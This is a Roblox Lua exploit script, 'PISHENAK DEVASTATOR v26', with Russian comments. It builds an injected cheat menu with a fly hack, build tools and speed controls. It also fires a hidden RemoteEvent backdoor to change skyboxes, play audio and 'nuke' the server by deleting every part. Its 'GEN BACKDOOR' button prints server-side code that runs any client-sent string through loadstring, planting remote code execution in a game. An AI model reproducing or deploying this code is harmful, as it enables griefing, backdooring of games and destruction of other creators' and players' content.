--[[
    PISHENAK DEVASTATOR v26 // PROJECT: OVERLORD
    BUILD: 2026.02.07
    CONTROLS: 'L' - Menu | 'E' - Fly | 'P' - Stealth Mode
]]

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local lighting = game:GetService("Lighting")
local uis = game:GetService("UserInputService")
local rs = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")

--------------------------------------------------
-- [1] ИНТЕРФЕЙС И ВАЙТЛИСТ
--------------------------------------------------
for _, v in pairs(coreGui:GetChildren()) do if v.Name == "DevUI_v26" then v:Destroy() end end
local sg = Instance.new("ScreenGui", coreGui) sg.Name = "DevUI_v26"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 550, 0, 480)
main.Position = UDim2.new(0.5, -275, 0.5, -240)
main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
main.Active = true
main.Draggable = true
Instance.new("UICorner", main)
Instance.new("UIStroke", main).Color = Color3.fromRGB(255, 0, 0)

local logBox = Instance.new("ScrollingFrame", main)
logBox.Size = UDim2.new(1, -20, 0, 100)
logBox.Position = UDim2.new(0, 10, 1, -110)
logBox.BackgroundColor3 = Color3.new(0,0,0)
local logLay = Instance.new("UIListLayout", logBox)

local function log(txt, col)
    local l = Instance.new("TextLabel", logBox)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = "> " .. txt
    l.TextColor3 = col or Color3.new(1,0,0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    logBox.CanvasPosition = Vector2.new(0, 9999)
end

--------------------------------------------------
-- [2] СИСТЕМЫ ПЕРЕДВИЖЕНИЯ (FLY & STEALTH)
--------------------------------------------------
local flying = false
local speed = 60
local bv, bg

local function toggleFly()
    flying = not flying
    local char = lp.Character or lp.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    if flying then
        bv = Instance.new("BodyVelocity", hrp)
        bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
        bg = Instance.new("BodyGyro", hrp)
        bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
        log("FLY: ON (E)", Color3.new(0,1,0))
        task.spawn(function()
            while flying do
                local dir = workspace.CurrentCamera.CFrame.LookVector
                if uis:IsKeyDown(Enum.KeyCode.W) then bv.Velocity = dir * speed
                elseif uis:IsKeyDown(Enum.KeyCode.S) then bv.Velocity = dir * -speed
                else bv.Velocity = Vector3.new(0,0.1,0) end
                bg.CFrame = workspace.CurrentCamera.CFrame
                task.wait()
            end
        end)
    else
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
        log("FLY: OFF", Color3.new(1,0,0))
    end
end

--------------------------------------------------
-- [3] ГЛОБАЛЬНЫЕ ФУНКЦИИ (BREACH & SS)
--------------------------------------------------
local function globalSend(code, val)
    local stream = rs:FindFirstChild("NetworkStream") or rs:FindFirstChild("InternalStatus")
    if stream and stream:IsA("RemoteEvent") then
        stream:FireServer(code, val)
        log("SS SUCCESS: DATA SENT", Color3.new(0, 1, 0))
    else
        log("SS FAIL: NO BACKDOOR DETECTED", Color3.new(1, 0.5, 0))
        if code == 882 then -- Локальный визуал
            local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)
            sky.SkyboxBk = val sky.SkyboxDn = val sky.SkyboxFt = val
            sky.SkyboxLf = val sky.SkyboxRt = val sky.SkyboxUp = val
        end
    end
end

--------------------------------------------------
-- [4] КНОПКИ И ИНТЕРФЕЙС
--------------------------------------------------
local idInput = Instance.new("TextBox", main)
idInput.Size = UDim2.new(0, 320, 0, 35)
idInput.Position = UDim2.new(0.5, -160, 0, 50)
idInput.PlaceholderText = "ID / CODE / ASSET"
idInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
idInput.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", idInput)

local grid = Instance.new("Frame", main)
grid.Size = UDim2.new(1, -20, 0, 240)
grid.Position = UDim2.new(0, 10, 0, 100)
grid.BackgroundTransparency = 1
Instance.new("UIGridLayout", grid).CellSize = UDim2.new(0, 170, 0, 40)

local function addBtn(txt, cb)
    local b = Instance.new("TextButton", grid)
    b.Text = txt b.BackgroundColor3 = Color3.fromRGB(35,0,0)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

-- Команды
addBtn("GLOBAL SKY", function() globalSend(882, "rbxassetid://"..idInput.Text) end)
addBtn("GLOBAL AUDIO", function() globalSend(993, "rbxassetid://"..idInput.Text) end)
addBtn("GIVE HAMMER", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("B-TOOLS GIVEN") end)
addBtn("SERVER NUKE", function() globalSend(771, "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v:Destroy() end end") end)

addBtn("GEN BACKDOOR", function()
    local c = [[local s=game:GetService("ReplicatedStorage") local r=s:FindFirstChild("NetworkStream") or Instance.new("RemoteEvent",s) r.Name="NetworkStream" r.OnServerEvent:Connect(function(_,i,v) if i==882 then local l=game:GetService("Lighting") local k=l:FindFirstChildOfClass("Sky") or Instance.new("Sky",l) k.SkyboxBk=v k.SkyboxDn=v k.SkyboxFt=v k.SkyboxLf=v k.SkyboxRt=v k.SkyboxUp=v elseif i==993 then local sn=Instance.new("Sound",workspace) sn.SoundId=v sn.Volume=10 sn:Play() elseif i==771 then loadstring(v)() end end)]]
    print("--- INJECTION CODE ---\n"..c.."\n--- END ---")
    log("CODE PRINTED TO F9 CONSOLE", Color3.new(1,1,0))
end)

addBtn("SPEED + (Q)", function() speed = speed + 20 log("SPEED: "..speed) end)
addBtn("FLY SPEED 50", function() speed = 50 end)
addBtn("CLEAR LOGS", function() for _,v in pairs(logBox:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end end)

--------------------------------------------------
-- [5] УПРАВЛЕНИЕ
--------------------------------------------------
uis.InputBegan:Connect(function(k, g)
    if g then return end
    if k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible
    elseif k.KeyCode == Enum.KeyCode.E then toggleFly()
    elseif k.KeyCode == Enum.KeyCode.Q then speed = speed + 10 end
end)

log("DEVASTATOR v26 LOADED. WELCOME, "..lp.Name)
